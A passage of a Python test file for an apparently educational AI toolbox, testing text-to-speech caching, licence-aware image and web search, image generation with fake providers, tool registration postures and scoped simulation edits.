    assert first.data['cached'] is False      # synthesised this time
    assert second.data['cached'] is True      # served from disk
    assert first.data['path'] == second.data['path']
    assert len(requests) == 1
    assert any('cached recording' in note for note in second.notes)


def test_tts_applies_the_configured_default_tone(settings, monkeypatch):
    """The teacher narration path passes text only; the tone comes from settings."""
    settings.media_enabled = True
    settings.voice_model = 'cosyvoice'
    settings.voice_instruct = 'kind primary-school teacher'
    captured = []
    _voice_transport(monkeypatch, _audio_handler(captured))
    result = toolbox.invoke(ctx_for(settings), 'text_to_speech', {'text': 'Hello.'})
    assert result.ok, result.refused + result.error
    assert captured[0]['instructions'] == 'kind primary-school teacher'


# -------------------------------------------------------------- image_search

def _candidate(source='openverse', title='supply and demand curve', licence='cc0',
               width=1200, height=800):
    return Candidate(source=source, source_id='1', title=title, licence_code=licence,
                     licence_url='https://creativecommons.org/publicdomain/zero/1.0/',
                     landing_page_url='https://openverse.test/x', file_url='https://files.test/x.jpg',
                     width=width, height=height, mime='image/jpeg', tags=[title])


def test_image_search_delegates_to_media_and_reports_honest_disabled_state(settings):
    result = toolbox.invoke(ctx_for(settings), 'image_search', {'query': 'supply curve'})
    assert not result.ok and 'disabled' in result.refused.casefold()


def test_image_search_returns_cleared_candidates_with_citations(settings, monkeypatch):
    settings.media_enabled = True
    from app.harness import media
    monkeypatch.setattr(media, 'search', lambda s, q, **kw: {
        'query': q, 'candidates': [_candidate()], 'providers': [], 'notes': []})
    result = toolbox.invoke(ctx_for(settings), 'image_search', {'query': 'supply curve'})
    assert result.ok, result.refused
    assert result.data['images'][0]['source'] == 'openverse'
    assert result.citations[0]['licence_class'] == 'cc0'
    assert 'Nothing was downloaded' in ' '.join(result.notes)


# ----------------------------------------------------------------- web_search

def test_web_search_refuses_when_disabled(settings):
    result = toolbox.invoke(ctx_for(settings), 'web_search', {'query': 'price controls case study'})
    assert not result.ok and 'disabled' in result.refused.casefold()


def test_web_search_refuses_when_package_missing(settings, monkeypatch):
    settings.media_enabled = True
    # ddg_provider.load() accepts either module name, so simulating "no provider
    # installed" has to clear both -- that is the same absence the loader reports.
    monkeypatch.setitem(sys.modules, 'ddgs', None)
    monkeypatch.setitem(sys.modules, 'duckduckgo_search', None)
    result = toolbox.invoke(ctx_for(settings), 'web_search', {'query': 'x'})
    assert not result.ok
    assert 'not configured' in result.refused.casefold()


def test_web_search_withholds_snippets_from_unclear_domains(settings, monkeypatch):
    settings.media_enabled = True
    from app.harness import tools_creation
    results = [
        {'title': 'Blog on rents', 'href': 'https://someblog.example/rents',
         'body': 'A juicy copied paragraph that we must not return.'},
        {'title': 'Wikipedia: Rent control', 'href': 'https://en.wikipedia.org/wiki/Rent_control',
         'body': 'Rent control is a legally mandated price ceiling.'},
        {'title': 'Khan page', 'href': 'https://www.khanacademy.org/x', 'body': 'nope'},
    ]
    fake_ddgs = ModuleType('ddgs')
    fake_ddgs.DDGS = lambda: type('D', (), {'text': lambda self, q, **kw: results})()
    monkeypatch.setitem(sys.modules, 'ddgs', fake_ddgs)
    result = toolbox.invoke(ctx_for(settings), 'web_search',
                            {'query': 'rent control case study', 'limit': 5})
    assert result.ok, result.refused + result.error
    by_host = {r['url']: r for r in result.data['results']}
    blog = by_host['https://someblog.example/rents']
    assert blog['mode'] == 'link_only' and 'snippet' not in blog
    assert blog['refusal_reason']
    wiki = by_host['https://en.wikipedia.org/wiki/Rent_control']
    assert wiki['mode'] == 'ingestible' and 'price ceiling' in wiki['snippet']
    assert by_host['https://www.khanacademy.org/x']['licence_class'] == 'prohibited'
    assert len(result.citations) == 3


# -------------------------------------------------------------- image_generate

def test_image_generate_refuses_when_disabled(settings):
    result = toolbox.invoke(ctx_for(settings), 'image_generate', {'prompt': 'a market'})
    assert not result.ok and 'disabled' in result.refused.casefold()


def test_image_generate_reports_provider_and_writes_file(settings, monkeypatch):
    settings.media_enabled = True
    from app.harness import tools_creation as tc

    class FakeOK(tc.ImageProvider):
        name = 'fake-provider'

        def available(self):
            return True

        def generate(self, prompt, width, height, seed):
            return b'PNGDATA', 'image/png'

    monkeypatch.setattr(tc, 'IMAGE_PROVIDERS', [FakeOK()])
    result = toolbox.invoke(ctx_for(settings), 'image_generate', {'prompt': 'a market'})
    assert result.ok, result.refused
    assert result.data['provider'] == 'fake-provider'
    assert (settings.data_dir / result.data['path']).read_bytes() == b'PNGDATA'


def test_image_generate_reports_honest_failure_when_all_providers_fail(settings, monkeypatch):
    settings.media_enabled = True
    from app.harness import tools_creation as tc

    class FakeDown(tc.ImageProvider):
        name = 'down-provider'

        def available(self):
            return True

        def generate(self, prompt, width, height, seed):
            raise RuntimeError('connection refused')

    monkeypatch.setattr(tc, 'IMAGE_PROVIDERS', [FakeDown()])
    result = toolbox.invoke(ctx_for(settings), 'image_generate', {'prompt': 'a market'})
    assert not result.ok
    assert 'down-provider' in result.refused and 'connection refused' in result.refused
    assert not (settings.data_dir / 'media' / 'generated').exists() or \
        not list((settings.data_dir / 'media' / 'generated').iterdir())


# --------------------------------------------------------------- registration

def test_creation_tools_are_registered_with_the_right_postures():
    expected = {'write_simulation': 'sandboxed', 'edit_simulation': 'sandboxed',
                'generate_slides': 'internal', 'text_to_speech': 'internal',
                'image_search': 'embed_only', 'web_search': 'ingestible',
                'image_generate': 'internal'}
    for name, posture in expected.items():
        assert name in toolbox.REGISTRY, name
        assert toolbox.REGISTRY[name][0].posture == posture, name


def test_scoped_edit_reaches_the_model_as_a_requirement(settings, monkeypatch):
    """The mechanism claim: the student's bug report becomes the model's instruction."""
    entry = sims_store.create_artifact(settings, kind='simulation', title='S', html=GOOD_SIM)
    seen: dict = {}

    class Recording(FakeProvider):
        def _chat(self, settings_, messages, **kwargs):
            seen['messages'] = messages
            return EDITED_SIM

    Recording('').install(monkeypatch)
    result = toolbox.invoke(ctx_for(settings, 'student'), 'edit_simulation',
                            {'artifact_id': entry['id'], 'requirement_category': 'bug',
                             'requirement_note': 'the axis labels do not render'})
    assert result.ok
    user_message = seen['messages'][1]['content']
    assert 'the axis labels do not render' in user_message
    assert 'Filed requirement (binding' in user_message
    assert '-----BEGIN CURRENT HTML-----' in user_message
    system = seen['messages'][0]['content']
    assert 'minimal' in system and 'new scope' in system
